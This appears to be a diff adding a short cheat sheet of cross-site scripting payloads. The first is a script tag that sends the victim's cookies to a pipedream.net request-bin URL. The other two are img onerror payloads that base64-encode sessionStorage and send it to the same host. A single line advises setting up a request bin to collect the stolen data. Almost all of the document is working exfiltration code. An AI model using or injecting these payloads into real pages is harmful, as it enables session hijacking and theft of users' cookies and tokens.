@@ -1,0 +1,9 @@
+<script>fetch('https://eo2h7v1hsj78cr0.m.pipedream.net/?cookie=' + document.cookie)</script>
+
+use request bin to create link
+
+<img src="asdf" onerror='fetch("https://eo2h7v1hsj78cr0.m.pipedream.net/?data=" + btoa(JSON.stringify(sessionStorage)));'/>
+
+
+<img src="asdf" onerror='var i=document.createElement("img");const src="https://eo2h7v1hsj78cr0.m.pipedream.net/?data="+btoa(JSON.stringify(sessionStorage));i.setAttribute("src", src);document.body.appendChild(i);'/>
+
